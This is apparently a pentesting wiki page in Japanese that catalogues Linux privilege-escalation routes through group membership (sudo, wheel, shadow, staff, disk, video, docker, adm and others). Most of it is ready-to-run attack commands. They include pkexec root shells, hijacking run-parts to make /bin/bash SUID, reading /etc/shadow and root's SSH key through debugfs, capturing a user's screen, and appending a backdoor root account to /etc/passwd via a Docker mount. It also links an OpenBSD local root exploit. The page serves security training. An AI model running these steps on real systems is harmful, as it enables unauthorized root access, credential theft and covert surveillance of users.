# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**場合によっては**、**デフォルトで（または一部の software が必要とするため）**、**/etc/sudoers** ファイル内に次のような行が見つかることがあります：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudo または admin グループに所属するユーザーは誰でも、sudo を使って任意の操作を実行できる**ことを意味します。

この場合、**root になるには次を実行するだけです**。
```
sudo su
```
### PE - Method 2

すべての suid バイナリを探し、**Pkexec** バイナリが存在するか確認します:
```bash
find / -perm -4000 2>/dev/null
```
**pkexec が SUID バイナリであり**、自分が **sudo** または **admin** に所属している場合、`pkexec` を使って sudo としてバイナリを実行できる可能性があります。\
これは、通常これらが **polkit policy** 内のグループだからです。この policy は基本的に、どのグループが `pkexec` を使用できるかを識別します。次のコマンドで確認します：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
そこでは、**pkexec** の実行を許可されているグループを確認できます。また、**デフォルトで**一部の Linux ディストロでは **sudo** と **admin** グループが表示されます。

**root になるには、次を実行します**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
**pkexec** を実行しようとして、次の **error** が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないからではなく、GUIなしでは接続されていないことが原因です**。この問題の workaround はこちらにあります：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なる ssh session** が必要です：<sup>[[1]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**場合によっては**、**デフォルトで** **/etc/sudoers** ファイル内に次の行があります：
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheel グループに所属するすべてのユーザーが sudo として何でも実行できる**ことを意味します。

この場合、**root になるには次を実行するだけです**:
```
sudo su
```
## Shadow Group

**group shadow** のユーザーは **/etc/shadow** ファイルを**読み取り**できます：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
それでは、ファイルを読み込み、**いくつかのハッシュをクラック**してみましょう。

ハッシュをトリアージする際の、ロック状態に関する簡単な注意点:
- `!` または `*` を含むエントリは、通常、パスワードログインでは非対話的です。
- `!hash` は通常、パスワードが設定された後にロックされたことを意味します。
- `*` は通常、有効なパスワードハッシュが一度も設定されていないことを意味します。
直接ログインがブロックされている場合でも、これはアカウントの分類に役立ちます。

## Staff Group

**staff**: ユーザーが root 権限なしでシステム（`/usr/local`）にローカルな変更を追加できるようにします（`/usr/local/bin` の実行ファイルはすべてのユーザーの PATH 変数に含まれており、同じ名前の `/bin` および `/usr/bin` の実行ファイルを「override」する可能性があることに注意してください）。監視や security により関連している group「adm」と比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)<sup>[[2]](#references)</sup>

debian distributions では、`$PATH` 変数により、特権ユーザーであるかどうかに関係なく、`/usr/local/` が最も高い優先度で実行されることが示されます。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
`/usr/local` にあるプログラムをいくつか hijack できれば、簡単に root を取得できます。

`run-parts` プログラムを hijack するのは root を簡単に取得する方法です。多くのプログラムが `run-parts` を実行するためです（crontab、SSH ログイン時など）。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
または、新しい ssh セッションでログインしたとき。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

この権限は、マシン内のすべてのデータにアクセスできるため、ほぼ **root access** と同等です。

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
debugfsを使用すると**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**root が所有するファイル**（`/etc/shadow` や `/etc/passwd` など）を**書き込もう**とすると、**Permission denied** エラーが発生します。

## Video Group

`w` コマンドを使用すると、**システムに誰がログオンしているか**を確認でき、次のような出力が表示されます。
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** は、ユーザー **yossi がマシン上の端末に物理的にログインしている**ことを意味します。

**video group** には、画面出力を表示する権限があります。基本的には、画面を監視できます。そのためには、**画面上の現在の画像を raw data として取得し**、画面で使用されている解像度を取得する必要があります。画面データは `/dev/fb0` に保存されており、この画面の解像度は `/sys/class/graphics/fb0/virtual_size` で確認できます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**raw image**を**開く**には**GIMP**を使用し、**`screen.raw`**ファイルを選択して、ファイルタイプとして**Raw image data**を選択します。

![Disk Group - Video Group: raw imageを開くにはGIMPを使用し、screen.rawファイルを選択して、ファイルタイプとしてRaw image dataを選択します](<../../../images/image (463).png>)

次に、WidthとHeightを画面で使用されている値に変更し、さまざまなImage Typesを確認します（画面が最も見やすく表示されるものを選択します）。

![Disk Group - Video Group: 次に、WidthとHeightを画面で使用されている値に変更し、さまざまなImage Typesを確認します（画面が最も見やすく表示されるものを選択します）](<../../../images/image (317).png>)

## Root Group

デフォルトでは、**root groupのメンバー**が一部の**service**設定ファイルや**library**ファイル、その他の権限昇格に利用できる**興味深いファイル**を**変更**できる可能性があります。

**rootメンバーが変更できるファイルを確認する**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

**ホストマシンの root filesystem をインスタンスの volume に mount**できるため、インスタンスが起動すると、その volume に対してすぐに `chroot` が実行されます。これにより、実質的にマシン上の root 権限が得られます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最後に、これまでの提案が気に入らない場合、または何らかの理由（docker api firewall など）で機能しない場合は、以下で説明されているように、**privileged container を実行してそこから escape する**方法もあります。

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socket への write permissions がある場合は、[**docker socket を悪用して privileges を escalate する方法についてのこの記事を読む**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

通常、**`adm`** group の **members** には、_/var/log/_ 内にある **log** files を **read** する permissions があります。\
したがって、この group に所属する user を compromise した場合は、必ず **logs を確認**してください。

## Backup / Operator / lp / Mail groups

これらの groups は、root への直接的な vectors というより、**credential-discovery** vectors になることがよくあります。
- **backup**: configs、keys、DB dumps、tokens を含む archives が露出する可能性があります。
- **operator**: platform-specific な operational access により、sensitive な runtime data が leak する可能性があります。
- **lp**: print queues/spools に document contents が含まれている可能性があります。
- **mail**: mail spools から reset links、OTPs、internal credentials が露出する可能性があります。

これらへの membership は high-value な data exposure finding として扱い、password/token reuse を通じて pivot してください。

## Auth group

OpenBSD では、**auth** group は通常、使用されている場合に _**/etc/skey**_ および _**/var/db/yubikey**_ folders への write が可能です。\
これらの permissions は、次の exploit により root への **privileges の escalate** に悪用できます: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## References

- [1] [pkexec/pkttyagent authentication without a GUI session (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)

{{#include ../../../banners/hacktricks-training.md}}
